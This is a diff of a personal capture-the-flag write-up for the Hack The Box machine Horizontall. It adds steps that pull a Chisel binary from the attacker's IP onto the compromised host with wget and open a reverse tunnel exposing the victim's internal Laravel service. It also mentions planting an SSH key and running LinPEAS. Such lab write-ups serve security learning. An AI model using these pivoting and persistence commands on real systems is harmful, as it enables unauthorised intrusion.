@@ -163,6 +163,7 @@ So, apparently you can put the attacker's public key inside `/opt/strapi/.ssh/au
 Attacker can now run:
 
     ssh strapi@horizontall.htb
+    bash
 
 The writeup recommends [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)...
 
@@ -189,15 +190,15 @@ Victim (dl and exec linpeas):
 
 It's useless -- apparently we need to exploit Laravel.
 
-#### Laravel
+## Laravel
 
 According to the writeup, I'm supposed to exploit Laravel, which is running on the victim, but the port isn't forwarded.
 
 So, the first step is to port forward using a tool called "Chisel".
 
-##### Port forward Laravel
+### Port forward Laravel
 
-###### Get Chisel binary into victim
+#### Get Chisel binary into victim
 
 On attacker:
 
@@ -212,8 +213,30 @@ On victim:
     wget 10.10.14.40:9090/chisel_1.7.6_linux_386
     mv chisel_1.7.6_linux_386 chisel
     chmod +x chisel
+    mv chisel /bin/ #if you can...
     ls
 
-##### Laravel RCE -> Root flag
+### Laravel RCE -> Root flag
 
-TODO
+#### Chisel port forward
+
+Going to cheat again and read the guide, since I have no idea how to use Chisel.
+
+Laravel is running on port 8000 on the victim machine -- but it is not exposed to the attacker. So, using Chisel is required in this step to expose Laravel to the attacker.
+
+    Attacker IP:    10.10.14.40
+    Victim IP:      10.10.11.105
+
+Attacker runs:
+
+    chisel server -p 6004 --reverse &
+
+Victim runs:
+
+    ./chisel client 10.10.14.40:6004 R:6001:127.0.0.1:8000
+
+Then, visit <http://127.0.0.1:6001/> on attacker browser.
+
+Look, it's Laravel!
+
+Apparently, it's Laravel v8 (PHP v7.4.18)
